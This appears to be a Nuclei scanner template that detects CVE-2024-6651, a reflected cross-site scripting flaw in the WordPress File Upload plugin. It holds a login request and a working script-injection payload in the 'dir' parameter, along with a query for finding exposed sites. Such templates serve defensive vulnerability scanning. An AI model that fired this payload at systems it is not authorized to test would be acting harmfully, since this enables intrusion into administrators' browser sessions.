flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - wp-file-upload/
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"><script>alert(document.domain)</script><test test='
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/options-general.php?page=wordpress_file_upload&action=file_browser&dir=7b2BEyT8ArR1jaD9%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Ctest%20test%3D
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-6651
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2024-6651
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
    cvss-score: 7.1
    cwe-id: CWE-79
    epss-percentile: 0.92839
    epss-score: 0.10104
  description: 'The WordPress File Upload plugin before version 4.24.8 contains a
    reflected cross-site scripting vulnerability. The plugin does not properly sanitize
    and escape the ''dir'' parameter in the file browser page before outputting it
    back, which could allow attackers to execute arbitrary JavaScript code in an administrator''s
    browser context.

    '
  impact: 'Attackers can execute arbitrary JavaScript in administrator browsers by
    crafting malicious URLs with XSS payloads in the dir parameter.

    '
  metadata:
    fofa-query: body='wp-content/plugins/wp-file-upload/'
    max-request: 3
    product: wp-file-upload
    vendor: WordPress
  name: WordPress File Upload Plugin < 4.24.8 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/65e2c77d-09bd-4a44-81d9-d7a5db0e0f84
  - https://nvd.nist.gov/vuln/detail/CVE-2024-6651
  remediation: 'Update WordPress File Upload plugin to version 4.24.8 or later to
    address the reflected XSS vulnerability.

    '
  severity: high
  tags: cve,cve2024,wp,wordpress,wp-plugin,xss,wp-file-upload,authenticated,vuln
